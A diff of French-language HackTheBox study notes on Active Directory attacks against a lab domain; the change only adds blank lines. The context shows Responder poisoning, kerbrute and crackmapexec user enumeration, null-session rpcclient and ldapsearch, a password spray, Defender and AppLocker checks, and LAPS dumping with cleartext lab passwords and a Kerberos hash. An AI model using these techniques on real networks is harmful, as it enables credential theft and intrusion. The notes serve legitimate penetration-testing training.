@@ -152,10 +152,12 @@ Cette commande capture et affiche les paquets réseau sur l’interface ens224
 keylian zergainoh@htb[/htb]$ sudo tcpdump -i ens224 
 ```
 
+
 Lance l’outil Responder sur l’interface ens224 en mode analyse.
 ```
 sudo responder -I ens224 -A
 ```
+
 
  Envoie des paquets ICMP à tous les hôtes dans le sous-réseau 172.16.5.0/23 pour déterminer lesquels sont actifs.
 ```
@@ -186,6 +188,7 @@ keylian zergainoh@htb[/htb]$ fping -asgq 172.16.5.0/23
  0.799 ms (max round trip time)
        15.366 sec (elapsed real time)
 ```
+
 
 Déplace l’exécutable kerbrute vers le répertoire /usr/local/bin pour le rendre accessible globalement.
 Utilise kerbrute pour énumérer les utilisateurs dans le domaine INLANEFREIGHT.LOCAL en utilisant le contrôleur de domaine 172.16.5.5 et enregistre les utilisateurs valides dans le fichier valid_ad_users.
@@ -328,11 +331,13 @@ sudo responder -I ens224
 
 ```
 
+
  Utilise enum4linux pour énumérer les utilisateurs sur l’hôte 172.16.5.5 et filtre les résultats pour afficher uniquement les noms d’utilisateur.
 ```
 enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 
 ```
+
 
 Utilise rpcclient pour se connecter à l’hôte 172.16.5.5 sans authentification.
 ```
@@ -340,30 +345,36 @@ rpcclient -U "" -N 172.16.5.5
 
 ```
 
+
  Utilise crackmapexec pour énumérer les utilisateurs SMB sur l’hôte 172.16.5.5.
 ```
 crackmapexec smb 172.16.5.5 --users
 ```
+
 
 Utilise windapsearch pour interroger le contrôleur de domaine à l’adresse IP 172.16.5.5 sans authentification et énumérer les utilisateurs.
 ```
 ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
 ```
 
+
 Utilise kerbrute pour énumérer les utilisateurs dans le domaine inlanefreight.local en utilisant le contrôleur de domaine 172.16.5.5 et le fichier de noms d’utilisateur jsmith.txt
 ```
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 ```
+
 
 Utilise crackmapexec pour énumérer les utilisateurs SMB sur l’hôte 172.16.5.5 avec les identifiants htb-student et Academy_student_AD!
 ```
 sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 ```
 
+
  Utilise ldapsearch pour interroger le serveur LDAP à 172.16.5.5 et filtre les résultats pour afficher les noms de compte SAM.
 ```
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
 ```
+
 
 Utilise kerbrute pour énumérer les utilisateurs dans le domaine INLANEFREIGHT en utilisant le contrôleur de domaine INLANEFREIGHT.LOCAL et le fichier de noms d’utilisateur jsmith.txt.
 ```
@@ -441,10 +452,12 @@ $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:232d64acb8a1f491a6fd11513d0881c3$1eadf
 2025/01/23 09:21:03 >  Done! Tested 48705 usernames (56 valid) in 11.225 seconds
 ```
 
+
 Cette commande utilise un script PowerShell pour effectuer une attaque de pulvérisation de mots de passe sur un domaine Active Directory.
 ```
 Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
+
 
 Cette commande PowerShell récupère l’état des différentes fonctionnalités de sécurité sur un ordinateur, en particulier celles liées à Windows Defender. Utile pour vérifier la configuration actuelle de Windows Defender, ce qui peut aider à comprendre quelles protections sont activées ou désactivées.
 ```
@@ -484,6 +497,7 @@ RealTimeProtectionEnabled       : True
 RealTimeScanDirection           : 0
 PSComputerName                  :
 ```
+
 
 Cette commande PowerShell récupère la politique AppLocker effective et affiche les collections de règles.
 Utile pour vérifier les règles AppLocker en vigueur sur un système, ce qui peut aider à comprendre quelles applications sont autorisées ou bloquées.
@@ -532,6 +546,7 @@ Action              : Allow
 
 ```
 
+
 Cette commande PowerShell affiche le mode de langage actuel de la session.
 Utile pour vérifier si la session PowerShell est en mode restreint ou complet, ce qui peut affecter l’exécution des scripts.
 ```
@@ -539,6 +554,7 @@ PS C:\htb> $ExecutionContext.SessionState.LanguageMode
 
 ConstrainedLanguage
 ```
+
 
 Cette commande PowerShell recherche dans toutes les unités d’organisation (OU) pour identifier les groupes Active Directory (AD) qui ont des droits de lecture délégués sur l’attribut ms-Mcs-AdmPwd. Utile pour vérifier quelles entités ont accès aux mots de passe gérés par LAPS (Local Administrator Password Solution), ce qui peut aider à comprendre les permissions de sécurité en vigueur sur un système.
 ```
@@ -566,6 +582,7 @@ OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
 OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
 ```
 
+
 Cette commande PowerShell affiche tous les ordinateurs avec LAPS (Local Administrator Password Solution) activé, y compris les informations sur l’expiration des mots de passe et les mots de passe eux-mêmes si l’utilisateur a les droits d’accès nécessaires. Utile pour auditer les environnements Active Directory qui ont déployé LAPS, ce qui peut aider à comprendre quelles machines sont protégées et comment les mots de passe administratifs sont gérés.
 ```
 PS C:\htb> Get-LAPSComputers
@@ -577,6 +594,7 @@ EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
 SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09
 WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04
 ```
+
 
 Cette série de commandes rpcclient permet d’effectuer plusieurs actions pour auditer un environnement Active Directory. Voici ce que chaque partie de la commande fait :
 
@@ -651,6 +669,7 @@ SystemsContainer                   : CN=System,DC=INLANEFREIGHT,DC=LOCAL
 UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL
 ```
 
+
 Cette commande PowerShell récupère tous les comptes d’utilisateurs dans Active Directory qui ont un attribut ServicePrincipalName non nul. Utile pour identifier les comptes de service, car ces comptes sont souvent utilisés par des applications et des services pour s’authentifier auprès d’autres services.
 ```
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
@@ -681,6 +700,7 @@ UserPrincipalName    :
 
 <SNIP>
 ```
+
 
 Cette commande PowerShell récupère toutes les relations de confiance (trusts) dans Active Directory. Utile pour obtenir une vue d’ensemble des relations de confiance établies entre différents domaines ou forêts, ce qui peut aider à comprendre les connexions et les permissions entre eux.
 ```
@@ -735,6 +755,7 @@ UsesAESKeys             : False
 UsesRC4Encryption       : False
 ```
 
+
 Cette commande PowerShell récupère tous les groupes dans Active Directory et sélectionne uniquement leurs noms. Utile pour obtenir une liste complète des noms de groupes présents dans un environnement Active Directory, ce qui peut aider à organiser et à gérer les permissions et les accès.
 ```
  Get-ADGroup -Filter * | select name
@@ -772,6 +793,7 @@ Domain Admins
 
 <SNIP>
 ```
+
 
 Cette commande PowerShell récupère les informations sur le groupe “Backup Operators” dans Active Directory. Utile pour obtenir des détails spécifiques sur ce groupe, comme ses membres, ses attributs et ses permissions, ce qui peut aider à gérer les accès et les rôles de sauvegarde dans un environnement Active Directory.
 ```
